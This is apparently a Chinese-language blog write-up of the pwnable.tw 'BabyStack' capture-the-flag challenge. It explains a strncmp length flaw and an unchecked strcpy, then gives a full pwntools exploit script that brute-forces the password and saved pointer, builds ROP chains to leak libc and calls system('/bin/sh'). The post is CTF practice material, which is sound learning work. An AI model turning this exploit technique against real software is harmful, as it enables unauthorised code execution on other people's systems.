---
layout: post
title: pwnable.tw BabyStack
date: 2023-10-23 19:51:17
tags: pwnable.tw
---

本地打通了，远程……台湾太远了……爆破到一半就会不知道谁把我连接掐掉……

![](https://blog-1308958542.cos.ap-shanghai.myqcloud.com/Snipaste_2023-10-23_20-43-43.jpg)

## 漏洞分析

本题主要有两个漏洞，一个是检查密码时，根据用户的输入的大小（strlen）作为 strncmp 的参数进行比较，然而这样会导致用户输入 NULL Byte 就通过检查，同时还允许了一字节一字节爆破得到正确的密码；甚至泄露密码后面的别的数据——在本题中就是程序基址。
另一个是一个没有检查大小的 strcpy。

## 漏洞利用

本题的流程就是先利用第一个漏洞来爆破得到栈上的密码以及 saved rbp，然后利用 strcpy 进行控制流劫持。由于 strcpy 限制 null byte 截断，所以我利用程序自己的 read wrapper 函数（CA0 处）来进行第二次写入，这次就可以写入 ROP chain。（这里调试得知 rdi 正好是栈上变量）
第一次写入 ROP chain，我泄露了 libc 的基址，让程序从 start 重头来过；第二次写入 ROP chain，我就直接执行 `system("/bin/sh")` 来拿到 shell。

```python
def pwn():
    # bruteforce password
    password = b""
    for i in range(0x10):
        for ch in range(1, 0x100):
            if ch == 0x0a:
                continue
            io.sendlineafter(b">> ", b"1")
            io.sendafter(b"passowrd", password + bytes([ch]) + b'\0')
            if b"Success" in io.recvline():
                # print(ch)
                password += bytes([ch])
                io.sendlineafter(b">> ", b"1")
                break
        if len(password) != i + 1:
            print("ERROR")
            exit()
    success("password: "+repr(password))
    # pause()

    # bruteforce saved rbp (progaddr)
    progaddr = b""
    for i in range(0x6):
        for ch in range(1, 0x100):
            if ch == 0x0a:
                continue
            io.sendafter(b">> ", b"1"*0x10)
            io.sendafter(b"passowrd", password + b'1'*0x10 + progaddr + bytes([ch]) + b'\0')
            if b"Success" in io.recvline():
                # print(ch)
                progaddr += bytes([ch])
                io.sendafter(b">> ", b"1"*0x10)
                break
        if len(progaddr) != i + 1:
            print("ERROR")
            exit()
    progaddr = unpack(progaddr+b'\0\0') - 0x1060
    success("stackaddr: "+hex(progaddr))

    my_read = 0xca0
    io.sendlineafter(b">> ", b"1")
    io.sendafter(b"passowrd", 0x10*b'\0'+0x30*b'a'+password+0x18*b'a' + pack(progaddr+my_read))
    io.sendlineafter(b">> ", b"3")
    io.sendafter(b"Copy :", b'a'*0x10)

    # pause()

    # ROP
    start = 0xb70
    pop_rdi = 0x10c3
    payload = flat([
        progaddr+pop_rdi,
        progaddr+elf.got['puts'],
        progaddr+elf.plt['puts'],
        progaddr+start,
    ])

    io.sendafter(b">> ", b"2"*0x10)
    io.send(pack(progaddr)+b'a'*0x18+payload)

    libcaddr = unpack(io.recvuntil(b"\n")[:-1]+b'\0\0') - libc.sym['puts']
    success("libcaddr: "+hex(libcaddr))

    # bruteforce password again
    io.sendlineafter(b">> ", b"1")
    password = b""
    for i in range(0x10):
        for ch in range(1, 0x100):
            if ch == 0x0a:
                continue
            io.sendlineafter(b">> ", b"1")
            io.sendafter(b"passowrd", password + bytes([ch]) + b'\0')
            if b"Success" in io.recvline():
                # print(ch)
                password += bytes([ch])
                io.sendlineafter(b">> ", b"1")
                break
        if len(password) != i + 1:
            print("ERROR")
            exit()
    success("password: "+repr(password))
    # pause()

    io.sendlineafter(b">> ", b"1")
    io.sendafter(b"passowrd", 0x10*b'\0'+0x30*b'a'+password+0x18*b'a' + pack(progaddr+my_read))
    io.sendlineafter(b">> ", b"3")
    io.sendafter(b"Copy :", b'a'*0x10)

    # pause()

    # ROP
    io.sendafter(b">> ", b"2"*0x10)
    io.send(pack(progaddr)+b'a'*0x18+pack(progaddr+pop_rdi)+pack(libcaddr+0x000000000018c177)+pack(libcaddr+libc.sym['system']))

    io.interactive()
```
